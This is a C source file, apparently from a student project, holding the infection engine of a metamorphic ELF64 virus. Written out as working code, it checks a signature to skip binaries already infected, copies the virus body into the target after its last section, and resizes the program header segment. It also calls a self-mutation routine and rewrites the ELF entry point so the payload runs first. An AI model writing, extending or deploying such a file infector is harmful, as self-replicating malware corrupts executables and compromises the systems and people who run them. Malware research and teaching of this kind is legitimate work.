/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection_engine.c                                 :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
/*   Updated: 2020/07/19 18:55:23 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "compiler_utils.h"
#include "errors.h"
#include "loader.h"
#include "utils.h"
#include "virus.h"

/*
** if current binary is already our client, don't infect again ! <3
*/

static bool	not_infected(const struct entry *original_entry, \
			struct safe_ptr ref)
{
	const Elf64_Off	sh_offset        = original_entry->safe_shdr->sh_offset;
	const size_t	entry_offset     = sh_offset + original_entry->offset_in_section;
	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;
	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
	char	 	*signature       = safe(ref, signature_offset, SIGNATURE_LEN);

	if (!signature) return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);

	if (checksum(signature, SIGNATURE_LEN) == SIGNATURE_CKSUM)
		return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);

	return true;
}

static bool	change_entry(struct safe_ptr ref, const struct entry *original_entry)
{
	Elf64_Ehdr	*clone_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));

	if (!clone_hdr)  return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);

	const Elf64_Xword	sh_offset         = original_entry->safe_shdr->sh_offset;
	const size_t		offset_in_section = original_entry->offset_in_section;
	const size_t		entry_off         = sh_offset + offset_in_section;
	const size_t		payload_offset    = original_entry->end_of_last_section;
	const Elf64_Xword	payload_distance  = payload_offset - entry_off;

	Elf64_Addr		e_entry = clone_hdr->e_entry;

	e_entry += payload_distance;
	clone_hdr->e_entry = e_entry;

	return true;
}

static bool	adjust_sizes(struct entry *clone_entry, size_t shift_amount)
{
	const size_t	payload_size = _start - loader_entry;

	clone_entry->safe_last_section_shdr->sh_size += payload_size;
	clone_entry->safe_phdr->p_filesz             += shift_amount;
	clone_entry->safe_phdr->p_memsz              += shift_amount;

	return true;
}

static bool	define_shift_amount(const struct entry *original_entry, size_t *shift_amount)
{
	const size_t	p_filesz        = original_entry->safe_phdr->p_filesz;
	const size_t	p_offset        = original_entry->safe_phdr->p_offset;
	const size_t	segment_end     = p_offset + p_filesz;
	const size_t	payload_size    = _start - loader_entry;
	const size_t	segment_padding = segment_end - original_entry->end_of_last_section;

	if (payload_size < segment_padding)
	{
		*shift_amount = 0;
		return true;
	}

	const size_t	p_memsz = original_entry->safe_phdr->p_memsz;
	const size_t	p_align = original_entry->safe_phdr->p_align;

	*shift_amount = ALIGN(payload_size, PAGE_ALIGNMENT);

	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;

	if (end_padding > p_align)
		return errors(ERR_VIRUS, _ERR_NOT_ENOUGH_PADDING);

	return true;
}

bool		get_client_id(uint64_t *client_id, struct safe_ptr ref)
{
	Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
	if (elf_hdr == NULL)
		return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
	*client_id = hash((void *)elf_hdr, sizeof(Elf64_Ehdr));
	return true;
}

bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref)
{
	struct entry	original_entry;
	struct entry	clone_entry;
	size_t		shift_amount;
	uint64_t	son_seed[2];
	uint64_t	client_id;

	if (!find_entry(&mut original_entry, original_ref)
	|| !not_infected(&original_entry, original_ref)
	|| !define_shift_amount(&mut original_entry, &mut shift_amount)
	|| !get_client_id(&mut client_id, original_ref)
	|| !copy_client_to_clone(clone_ref, original_ref, original_entry.end_of_last_section, shift_amount, original_ref.size)
	|| !copy_virus_to_clone(clone_ref, &original_entry)
	|| !metamorph_self(clone_ref, original_entry.end_of_last_section, son_seed, client_id)
	|| !adjust_references(clone_ref , shift_amount, original_entry.end_of_last_section)
	|| !find_entry(&mut clone_entry, clone_ref)
	|| !adjust_sizes(&mut clone_entry, shift_amount)
	|| !setup_virus_header(clone_ref, original_entry.end_of_last_section, son_seed)
	|| !change_entry(clone_ref, &original_entry))
		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);

	return true;
}
